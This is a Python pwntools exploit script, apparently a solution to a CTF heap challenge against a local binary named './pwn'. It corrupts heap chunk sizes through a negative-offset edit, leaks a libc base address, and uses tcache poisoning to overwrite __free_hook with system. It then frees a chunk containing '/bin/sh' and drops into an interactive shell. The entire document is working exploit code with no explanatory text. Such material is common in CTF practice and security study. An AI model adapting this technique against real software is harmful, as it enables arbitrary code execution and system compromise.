from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'Your choice: '
def add(idx, size):
	sla(menu, b'1')
	sla(b'Index: ', byte(idx))
	sla(b'Size: ', byte(size))	
	
def edit(idx, offset, size, content):
	sla(menu, b'2')
	sla(b'Index: ', byte(idx))
	sla(b'Offset: ', byte(offset))
	sla(b'Size: ', byte(size))
	sda(b'Content: ', content)

def dele(idx):
	sla(menu, b'3')
	sla(b'Index: ', byte(idx))

def op():
	sla(menu, b'4')

def clo():
	sla(menu, b'5')

add(0, 0x18) # 0
add(1, 0x18) # 1
op()
add(2, 0x18) # 2
edit(0, -8, 8, p64(0x8081))
clo()
dele(0)
add(0, 0x98) # 0
add(3, 0x18) # 3
edit(3, -8, 8, b'A'*8)
clo()
rut(b'AAAAA')
libc.address = addr64(b'\n') - 0x3ebca0
print("libc_base : ", hex(libc.address))
edit(3, -8, 8, p64(0x21))
dele(3)
payload = p64(0)*3 + p64(0x21)
edit(0, 0, len(payload), payload) 
dele(1)
payload = p64(0)*3 + p64(0x21) + p64(libc.sym.__free_hook)
edit(0, 0, len(payload), payload)
add(3, 0x18)
add(1, 0x18)
edit(3, 0, 8, b'/bin/sh\x00')
edit(1, 0, 8, p64(libc.sym.system))
dele(3)

#debug()
sh()
